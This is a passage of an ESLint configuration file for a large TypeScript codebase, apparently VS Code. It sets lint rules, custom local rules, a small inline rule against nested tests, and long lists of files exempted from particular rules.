/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// @ts-check
import { fixupPluginRules } from '@eslint/compat';
import { defineConfig } from 'eslint/config';
import fs from 'fs';
import { builtinModules } from 'module';
import path from 'path';
import tseslint from 'typescript-eslint';

import stylistic from '@stylistic/eslint-plugin';
import * as pluginLocal from './.eslint-plugin-local/index.ts';
import * as pluginCopilotLocal from './extensions/copilot/.eslintplugin/index.ts';
import pluginImport from 'eslint-plugin-import';
import pluginJsdoc from 'eslint-plugin-jsdoc';

import pluginHeader from 'eslint-plugin-header';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

pluginHeader.rules.header.meta.schema = false;

const ignores = fs.readFileSync(path.join(import.meta.dirname, '.eslint-ignore'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.filter(line => line && !line.startsWith('#'));

const allowedJavaScriptFiles = fs.readFileSync(path.join(import.meta.dirname, '.eslint-allowed-javascript-files'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.map(line => line.trim())
	.filter(line => line && !line.startsWith('#'));

const allowedBracketNotationFiles = fs.readFileSync(path.join(import.meta.dirname, '.eslint-allowed-bracket-notation-files'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.map(line => line.trim())
	.filter(line => line && !line.startsWith('#'));

export default defineConfig(
	// Global ignores
	{
		ignores: [
			...ignores,
			'!**/.eslint-plugin-local/**/*'
		],
	},
	// All files (JS and TS)
	{
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
			'header': fixupPluginRules(/** @type {any} */ (pluginHeader)),
		},
		rules: {
			'constructor-super': 'warn',
			'curly': 'warn',
			'eqeqeq': 'warn',
			'prefer-const': [
				'warn',
				{
					'destructuring': 'all'
				}
			],
			'no-buffer-constructor': 'warn',
			'no-caller': 'warn',
			'no-case-declarations': 'warn',
			'no-debugger': 'warn',
			'no-duplicate-case': 'warn',
			'no-duplicate-imports': 'warn',
			'no-eval': 'warn',
			'no-async-promise-executor': 'warn',
			'no-extra-semi': 'warn',
			'no-new-wrappers': 'warn',
			'no-redeclare': 'off',
			'no-sparse-arrays': 'warn',
			'no-throw-literal': 'warn',
			'no-unsafe-finally': 'warn',
			'no-unused-labels': 'warn',
			'no-misleading-character-class': 'warn',
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context'
			], // non-complete list of globals that are easy to access unintentionally
			'no-var': 'warn',
			'semi': 'warn',
			'local/code-translation-remind': 'warn',
			'local/code-no-declare-const-enum': 'warn',
			'local/code-parameter-properties-must-have-explicit-accessibility': 'warn',
			'local/code-no-nls-in-standalone-editor': 'warn',
			'local/code-no-potentially-unsafe-disposables': 'warn',
			'local/code-no-dangerous-type-assertions': 'warn',
			'local/code-no-any-casts': 'warn',
			'local/code-no-standalone-editor': 'warn',
			'local/code-no-unexternalized-strings': 'warn',
			'local/code-must-use-super-dispose': 'warn',
			'local/code-declare-service-brand': 'warn',
			'local/code-no-reader-after-await': 'warn',
			'local/code-no-accessor-after-await': 'warn',
			'local/code-no-observable-get-in-reactive-context': 'warn',
			'local/code-no-localized-model-description': 'warn',
			'local/code-policy-localization-key-match': 'warn',
			'local/code-no-localization-template-literals': 'error',
			'local/code-no-icons-in-localized-strings': 'warn',
			'local/code-no-http-import': ['warn', { target: 'src/vs/**' }],
			'local/code-no-deep-import-of-internal': ['error', { '.*Internal': true, 'searchExtTypesInternal': false }],
			'local/code-no-private-agent-host-meta-import': 'error',
			'local/code-layering': [
				'warn',
				{
					'common': [],
					'node': [
						'common'
					],
					'browser': [
						'common'
					],
					'electron-browser': [
						'common',
						'browser'
					],
					'electron-utility': [
						'common',
						'node'
					],
					'electron-main': [
						'common',
						'node',
						'electron-utility'
					]
				}
			],
			'header/header': [
				2,
				'block',
				[
					'---------------------------------------------------------------------------------------------',
					' *  Copyright (c) Microsoft Corporation. All rights reserved.',
					' *  Licensed under the MIT License. See License.txt in the project root for license information.',
					' *--------------------------------------------------------------------------------------------'
				]
			]
		},
	},
	// Disallow bracket notation for property names that can use dot notation.
	{
		files: [
			'**/*.{js,cjs,mjs,ts,tsx,mts,cts}',
			'.eslint-plugin-local/**/*.ts',
		],
		ignores: allowedBracketNotationFiles,
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-bracket-notation-for-identifiers': 'warn',
		},
	},
	// TS
	{
		files: [
			'**/*.{ts,tsx,mts,cts}',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@stylistic': stylistic,
			'@typescript-eslint': tseslint.plugin,
			'local': pluginLocal,
			'jsdoc': pluginJsdoc,
		},
		rules: {
			// Disable built-in semi rules in favor of stylistic
			'semi': 'off',
			'@stylistic/semi': 'warn',
			'@stylistic/member-delimiter-style': 'warn',
			'local/code-no-unused-expressions': [
				'warn',
				{
					'allowTernary': true
				}
			],
			'jsdoc/no-types': 'warn',
			'local/code-no-static-self-ref': 'warn',
			'@typescript-eslint/naming-convention': [
				'warn',
				{
					'selector': 'class',
					'format': [
						'PascalCase'
					]
				}
			]
		}
	},
	{
		files: [
			'src/vs/platform/agentHost/test/**/missionControl*.test.ts',
			'src/vs/platform/agentHost/test/**/protocolServerHandler.test.ts',
			'src/vs/platform/agentHost/test/**/agentHostProtocolClient.test.ts',
			'src/vs/platform/agentHost/test/**/webPubSubRelayTransport.test.ts',
			'src/vs/platform/agentHost/test/common/webPubSub/*.test.ts',
			'src/vs/workbench/contrib/chat/test/browser/remoteAgentHost/cloudSandbox*.test.ts',
			'src/vs/sessions/contrib/providers/remoteAgentHost/test/browser/remoteAgentHost.contribution.test.ts',
		],
		plugins: {
			'agent-host-test': {
				rules: {
					'no-nested-tests': {
						meta: {
							type: 'problem',
							schema: [],
							messages: { nested: 'Declare tests in the suite, not inside another test; Mocha does not execute nested declarations.' },
						},
						create(context) {
							return {
								'CallExpression[callee.name="test"] CallExpression[callee.name="test"]'(node) {
									context.report({ node, messageId: 'nested' });
								},
							};
						},
					},
				},
			},
		},
		rules: {
			'agent-host-test/no-nested-tests': 'error',
		},
	},
	// Disallow common telemetry properties in event data
	{
		files: [
			'src/**/*.ts',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-telemetry-common-property': 'warn',
		}
	},
	// Force all gulp imports under build/ to go through the gulp facade
	{
		files: [
			'build/**/*.ts',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-direct-gulp-import': 'warn',
		}
	},
	// Disallow 'in' operator except in type predicates
	{
		files: [
			'**/*.ts',
			'.eslint-plugin-local/**/*.ts', // Explicitly include files under dot directories
		],
		ignores: [
			'src/bootstrap-node.ts',
			'build/lib/extensions.ts',
			'build/lib/test/render.test.ts',
			'extensions/copilot/**/*',
			'extensions/debug-auto-launch/src/extension.ts',
			'extensions/emmet/src/updateImageSize.ts',
			'extensions/emmet/src/util.ts',
			'extensions/github-authentication/src/node/fetch.ts',
			'extensions/tunnel-forwarding/src/extension.ts',
			'extensions/typescript-language-features/src/utils/platform.ts',
			'extensions/typescript-language-features/web/src/webServer.ts',
			'src/vs/base/browser/broadcast.ts',
			'src/vs/base/browser/canIUse.ts',
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/markdownRenderer.ts',
			'src/vs/base/browser/touch.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/desktopEnvironmentInfo.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/editor/browser/controller/editContext/native/debugEditContext.ts',
			'src/vs/editor/browser/gpu/gpuUtils.ts',
			'src/vs/editor/browser/gpu/taskQueue.ts',
			'src/vs/editor/browser/view.ts',
			'src/vs/editor/browser/widget/diffEditor/diffEditorWidget.ts',
			'src/vs/editor/browser/widget/diffEditor/utils.ts',
			'src/vs/editor/browser/widget/multiDiffEditor/multiDiffEditorWidgetImpl.ts',
			'src/vs/editor/common/config/editorOptions.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteContribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteController.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/edit.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/provideInlineCompletions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/platform/accessibilitySignal/browser/accessibilitySignalService.ts',
			'src/vs/platform/configuration/common/configuration.ts',
			'src/vs/platform/configuration/common/configurationModels.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/test/common/scanner.test.ts',
			'src/vs/platform/dataChannel/browser/forwardingTelemetryService.ts',
			'src/vs/platform/hover/browser/hoverService.ts',
			'src/vs/platform/hover/browser/hoverWidget.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/mcp/common/mcpManagementCli.ts',
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/browser/mainThreadDebugService.ts',
			'src/vs/workbench/api/browser/mainThreadTesting.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHostChatAgents2.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostNotebookKernels.ts',
			'src/vs/workbench/api/common/extHostQuickOpen.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/node/loopbackServer.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/extHostTypeConverters.test.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/browser/parts/paneCompositeBar.ts',
			'src/vs/workbench/browser/parts/titlebar/titlebarPart.ts',
			'src/vs/workbench/browser/workbench.ts',
			'src/vs/workbench/common/notifications.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/attachments/chatAttachmentResolveService.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatAttachmentsContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatConfirmationWidget.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatElicitationContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatReferencesContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatTreeContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/toolInvocationParts/abstractToolConfirmationSubPart.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSession.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSessionStorage.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatInlineAnchorWidget.ts',
			'src/vs/workbench/contrib/chat/browser/accessibility/chatResponseAccessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/widget/input/editor/chatInputCompletions.ts',
			'src/vs/workbench/contrib/chat/common/model/chatModel.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.test.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.ts',
			'src/vs/workbench/contrib/chat/test/common/tools/builtinTools/manageTodoListTool.test.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/debugModel.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replAccessibilityAnnouncer.ts',
			'src/vs/workbench/contrib/editSessions/browser/editSessionsStorageService.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/extensions/common/extensionQuery.ts',
			'src/vs/workbench/contrib/interactive/browser/interactiveEditorInput.ts',
			'src/vs/workbench/contrib/issue/browser/issueFormService.ts',
			'src/vs/workbench/contrib/issue/browser/issueQuickAccess.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mcp/browser/mcpElicitationService.ts',
			'src/vs/workbench/contrib/mcp/common/mcpLanguageModelToolContribution.ts',
			'src/vs/workbench/contrib/mcp/common/mcpResourceFilesystem.ts',
			'src/vs/workbench/contrib/mcp/common/mcpSamplingLog.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServer.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServerRequestHandler.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpRegistryTypes.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpServerRequestHandler.test.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/cellOutputActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/notebook.chat.contribution.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelView.ts',
			'src/vs/workbench/contrib/output/browser/outputView.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/remoteTunnel/electron-browser/remoteTunnel.contribution.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/listProjection.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/treeProjection.ts',
			'src/vs/workbench/contrib/testing/browser/testCoverageBars.ts',
			'src/vs/workbench/contrib/testing/browser/testExplorerActions.ts',
			'src/vs/workbench/contrib/testing/browser/testingOutputPeek.ts',
			'src/vs/workbench/contrib/testing/browser/testingProgressUiService.ts',
			'src/vs/workbench/contrib/testing/browser/testResultsView/testResultsTree.ts',
			'src/vs/workbench/contrib/testing/common/testCoverageService.ts',
			'src/vs/workbench/contrib/testing/common/testResultService.ts',
			'src/vs/workbench/contrib/testing/common/testingChatAgentTool.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/themes/browser/themes.contribution.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStarted.contribution.ts',
			'src/vs/workbench/services/environment/electron-browser/environmentService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingIO.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/textSearchManager.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/platform/agentHost/common/state/protocol/**',
			'test/automation/src/playwrightDriver.ts',
			'.eslint-plugin-local/**/*',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-in-operator': 'warn',
		}
	},
	// Guard the agent host protocol `_meta` bag: no untyped field access or casts.
	{
		files: [
			'src/vs/platform/agentHost/**/*.ts',
			'src/vs/workbench/contrib/chat/browser/agentSessions/**/*.ts',
			'src/vs/workbench/services/agentHost/**/*.ts',
			'src/vs/sessions/**/*.ts',
		],
		ignores: [
			// Tests assert on the raw `_meta` wire shape on purpose (verifying
			// producers); routing them through readers would weaken them.
			'**/test/**',
			'**/*.test.ts',
			'**/*.integrationTest.ts',
			// This directory is the validation boundary for typed metadata
			// readers. Callers elsewhere must consume those readers.
			'src/vs/platform/agentHost/common/meta/**',
			// Copilot SDK metadata is already typed and is not an AHP `_meta`
			// bag. Keep its access isolated in one adapter.
			'src/vs/platform/agentHost/node/copilot/copilotSdkMeta.ts',
			// Codex's own generated app-server protocol (not AHP `_meta`).
			'src/vs/platform/agentHost/node/codex/protocol/**',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-untyped-meta-access': 'warn',
		}
	},
	// Strict no explicit `any`
	{
		files: [
			// Extensions
			'extensions/git/src/**/*.ts',
			'extensions/git-base/src/**/*.ts',
			'extensions/github/src/**/*.ts',
			// vscode
			'src/**/*.ts',
		],
		ignores: [
			// Extensions
			'extensions/git/src/commands.ts',
			'extensions/git/src/decorators.ts',
			'extensions/git/src/git.ts',
			'extensions/git/src/util.ts',
			'extensions/git-base/src/decorators.ts',
			'extensions/github/src/util.ts',
			// vscode d.ts
			'src/vs/amdX.ts',
			'src/vs/monaco.d.ts',
			'src/vscode-dts/**',
			// Base
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/mouseEvent.ts',
			'src/vs/base/node/processes.ts',
			'src/vs/base/common/arrays.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/console.ts',
			'src/vs/base/common/decorators.ts',
			'src/vs/base/common/errorMessage.ts',
			'src/vs/base/common/errors.ts',
			'src/vs/base/common/event.ts',
			'src/vs/base/common/hotReload.ts',
			'src/vs/base/common/hotReloadHelpers.ts',
			'src/vs/base/common/json.ts',
			'src/vs/base/common/jsonSchema.ts',
			'src/vs/base/common/lifecycle.ts',
			'src/vs/base/common/map.ts',
			'src/vs/base/common/marshalling.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/performance.ts',
			'src/vs/base/common/platform.ts',
			'src/vs/base/common/processes.ts',
			'src/vs/base/common/types.ts',
			'src/vs/base/common/uriIpc.ts',
			'src/vs/base/common/verifier.ts',
			'src/vs/base/common/observableInternal/base.ts',
			'src/vs/base/common/observableInternal/changeTracker.ts',
			'src/vs/base/common/observableInternal/set.ts',
			'src/vs/base/common/observableInternal/transaction.ts',
			'src/vs/base/common/worker/webWorkerBootstrap.ts',
			'src/vs/base/test/common/mock.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/base/test/common/troubleshooting.ts',
			'src/vs/base/test/common/utils.ts',
			'src/vs/base/browser/ui/breadcrumbs/breadcrumbsWidget.ts',
			'src/vs/base/browser/ui/grid/grid.ts',
			'src/vs/base/browser/ui/grid/gridview.ts',
			'src/vs/base/browser/ui/list/listPaging.ts',
			'src/vs/base/browser/ui/list/listView.ts',
			'src/vs/base/browser/ui/list/listWidget.ts',
			'src/vs/base/browser/ui/list/rowCache.ts',
			'src/vs/base/browser/ui/sash/sash.ts',
			'src/vs/base/browser/ui/table/tableWidget.ts',
			'src/vs/base/parts/ipc/common/ipc.net.ts',
			'src/vs/base/parts/ipc/common/ipc.ts',
			'src/vs/base/parts/ipc/electron-main/ipcMain.ts',
			'src/vs/base/parts/ipc/node/ipc.cp.ts',
			'src/vs/base/common/observableInternal/experimental/reducer.ts',
			'src/vs/base/common/observableInternal/experimental/utils.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugGetDependencyGraph.ts',
			'src/vs/base/common/observableInternal/logging/logging.ts',
			'src/vs/base/common/observableInternal/observables/baseObservable.ts',
			'src/vs/base/common/observableInternal/observables/derived.ts',
			'src/vs/base/common/observableInternal/observables/derivedImpl.ts',
			'src/vs/base/common/observableInternal/observables/observableFromEvent.ts',
			'src/vs/base/common/observableInternal/observables/observableSignalFromEvent.ts',
			'src/vs/base/common/observableInternal/reactions/autorunImpl.ts',
			'src/vs/base/common/observableInternal/utils/utils.ts',
			'src/vs/base/common/observableInternal/utils/utilsCancellation.ts',
			'src/vs/base/parts/ipc/test/node/testService.ts',
			'src/vs/base/common/observableInternal/logging/debugger/debuggerRpc.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/rpc.ts',
			'src/vs/base/test/browser/ui/grid/util.ts',
			// Platform
			'src/vs/platform/commands/common/commands.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/common/contextkey.ts',
			'src/vs/platform/contextview/browser/contextView.ts',
			'src/vs/platform/debug/common/extensionHostDebugIpc.ts',
			'src/vs/platform/debug/electron-main/extensionHostDebugIpc.ts',
			'src/vs/platform/diagnostics/common/diagnostics.ts',
			'src/vs/platform/download/common/downloadIpc.ts',
			'src/vs/platform/extensions/common/extensions.ts',
			'src/vs/platform/instantiation/common/descriptors.ts',
			'src/vs/platform/instantiation/common/extensions.ts',
			'src/vs/platform/instantiation/common/instantiation.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/instantiation/common/serviceCollection.ts',
			'src/vs/platform/keybinding/common/keybinding.ts',
			'src/vs/platform/keybinding/common/keybindingResolver.ts',
			'src/vs/platform/keybinding/common/keybindingsRegistry.ts',
			'src/vs/platform/keybinding/common/resolvedKeybindingItem.ts',
			'src/vs/platform/languagePacks/node/languagePacks.ts',
			'src/vs/platform/list/browser/listService.ts',
			'src/vs/platform/log/browser/log.ts',
			'src/vs/platform/log/common/log.ts',
			'src/vs/platform/log/common/logIpc.ts',
			'src/vs/platform/log/electron-main/logIpc.ts',
			'src/vs/platform/meteredConnection/electron-main/meteredConnectionChannel.ts',
			'src/vs/platform/observable/common/wrapInHotClass.ts',
			'src/vs/platform/observable/common/wrapInReloadableClass.ts',
			'src/vs/platform/policy/common/policyIpc.ts',
			'src/vs/platform/profiling/common/profilingTelemetrySpec.ts',
			'src/vs/platform/quickinput/browser/quickInputActions.ts',
			'src/vs/platform/quickinput/common/quickInput.ts',
			'src/vs/platform/registry/common/platform.ts',
			'src/vs/platform/remote/browser/browserSocketFactory.ts',
			'src/vs/platform/remote/browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remote/common/remoteAgentConnection.ts',
			'src/vs/platform/remote/common/remoteAuthorityResolver.ts',
			'src/vs/platform/remote/electron-browser/electronRemoteResourceLoader.ts',
			'src/vs/platform/remote/electron-browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remoteTunnel/node/remoteTunnelService.ts',
			'src/vs/platform/request/common/request.ts',
			'src/vs/platform/request/common/requestIpc.ts',
			'src/vs/platform/request/electron-utility/requestService.ts',
			'src/vs/platform/request/node/proxy.ts',
			'src/vs/platform/telemetry/browser/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/remoteTelemetryChannel.ts',
			'src/vs/platform/telemetry/node/errorTelemetry.ts',
			'src/vs/platform/theme/common/iconRegistry.ts',
			'src/vs/platform/theme/common/tokenClassificationRegistry.ts',
			'src/vs/platform/update/common/updateIpc.ts',
			'src/vs/platform/update/electron-main/updateService.snap.ts',
			'src/vs/platform/url/common/urlIpc.ts',
			'src/vs/platform/userDataProfile/common/userDataProfileIpc.ts',
			'src/vs/platform/userDataProfile/electron-main/userDataProfileStorageIpc.ts',
			'src/vs/platform/userDataSync/common/abstractSynchronizer.ts',
			'src/vs/platform/userDataSync/common/extensionsMerge.ts',
			'src/vs/platform/userDataSync/common/extensionsSync.ts',
			'src/vs/platform/userDataSync/common/globalStateMerge.ts',
			'src/vs/platform/userDataSync/common/globalStateSync.ts',
			'src/vs/platform/userDataSync/common/settingsMerge.ts',
			'src/vs/platform/userDataSync/common/settingsSync.ts',
			'src/vs/platform/userDataSync/common/userDataSync.ts',
			'src/vs/platform/userDataSync/common/userDataSyncIpc.ts',
			'src/vs/platform/userDataSync/common/userDataSyncServiceIpc.ts',
			'src/vs/platform/webview/common/webviewManagerService.ts',
			'src/vs/platform/instantiation/test/common/instantiationServiceMock.ts',
			'src/vs/platform/keybinding/test/common/mockKeybindingService.ts',
			// Editor
			'src/vs/editor/standalone/browser/standaloneEditor.ts',
			'src/vs/editor/standalone/browser/standaloneLanguages.ts',
			'src/vs/editor/standalone/browser/standaloneServices.ts',
			'src/vs/editor/test/browser/testCodeEditor.ts',
			'src/vs/editor/test/common/testTextModel.ts',
			'src/vs/editor/contrib/bracketMatching/browser/bracketMatching.ts',
			'src/vs/editor/contrib/codeAction/browser/codeAction.ts',
			'src/vs/editor/contrib/codeAction/browser/codeActionCommands.ts',
			'src/vs/editor/contrib/codeAction/common/types.ts',
			'src/vs/editor/contrib/colorPicker/browser/colorDetector.ts',
			'src/vs/editor/contrib/diffEditorBreadcrumbs/browser/contribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/dropIntoEditorContribution.ts',
			'src/vs/editor/contrib/find/browser/findController.ts',
			'src/vs/editor/contrib/find/browser/findModel.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/goToCommands.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/symbolNavigation.ts',
			'src/vs/editor/contrib/hover/browser/hoverActions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/structuredLogger.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/utils.ts',
			'src/vs/editor/contrib/smartSelect/browser/smartSelect.ts',
			'src/vs/editor/contrib/stickyScroll/browser/stickyScrollModelProvider.ts',
			'src/vs/editor/contrib/unicodeHighlighter/browser/unicodeHighlighter.ts',
			'src/vs/editor/contrib/wordHighlighter/browser/wordHighlighter.ts',
			'src/vs/editor/standalone/common/monarch/monarchCommon.ts',
			'src/vs/editor/standalone/common/monarch/monarchCompile.ts',
			'src/vs/editor/standalone/common/monarch/monarchLexer.ts',
			'src/vs/editor/standalone/common/monarch/monarchTypes.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/controller/commands.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/inlineCompletionsModel.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/typingSpeed.ts',
			'src/vs/editor/contrib/inlineCompletions/test/browser/utils.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/components/gutterIndicatorView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/utils/utils.ts',
			// Workbench
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHost.protocol.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostCodeInsets.ts',
			'src/vs/workbench/api/common/extHostCommands.ts',
			'src/vs/workbench/api/common/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/common/extHostDataChannels.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostExtensionActivator.ts',
			'src/vs/workbench/api/common/extHostExtensionService.ts',
			'src/vs/workbench/api/common/extHostFileSystemConsumer.ts',
			'src/vs/workbench/api/common/extHostFileSystemEventService.ts',
			'src/vs/workbench/api/common/extHostLanguageFeatures.ts',
			'src/vs/workbench/api/common/extHostLanguageModelTools.ts',
			'src/vs/workbench/api/common/extHostMcp.ts',
			'src/vs/workbench/api/common/extHostMemento.ts',
			'src/vs/workbench/api/common/extHostMessageService.ts',
			'src/vs/workbench/api/common/extHostNotebookDocument.ts',
			'src/vs/workbench/api/common/extHostNotebookDocumentSaveParticipant.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostRpcService.ts',
			'src/vs/workbench/api/common/extHostSCM.ts',
			'src/vs/workbench/api/common/extHostSearch.ts',
			'src/vs/workbench/api/common/extHostStatusBar.ts',
			'src/vs/workbench/api/common/extHostStoragePaths.ts',
			'src/vs/workbench/api/common/extHostTelemetry.ts',
			'src/vs/workbench/api/common/extHostTesting.ts',
			'src/vs/workbench/api/common/extHostTextEditor.ts',
			'src/vs/workbench/api/common/extHostTimeline.ts',
			'src/vs/workbench/api/common/extHostTreeViews.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/common/extHostTypes/es5ClassCompat.ts',
			'src/vs/workbench/api/common/extHostTypes/location.ts',
			'src/vs/workbench/api/common/extHostWebview.ts',
			'src/vs/workbench/api/common/extHostWebviewMessaging.ts',
			'src/vs/workbench/api/common/extHostWebviewPanels.ts',
			'src/vs/workbench/api/common/extHostWebviewView.ts',
			'src/vs/workbench/api/common/extHostWorkspace.ts',
			'src/vs/workbench/api/common/extensionHostMain.ts',
			'src/vs/workbench/api/node/extHostAuthentication.ts',
			'src/vs/workbench/api/node/extHostCLIServer.ts',
			'src/vs/workbench/api/node/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/node/extHostDownloadService.ts',
			'src/vs/workbench/api/node/extHostExtensionService.ts',
			'src/vs/workbench/api/node/extHostMcpNode.ts',
			'src/vs/workbench/api/node/extensionHostProcess.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/api/worker/extensionHostWorker.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibilityConfiguration.ts',
			'src/vs/workbench/contrib/accessibilitySignals/browser/commands.ts',
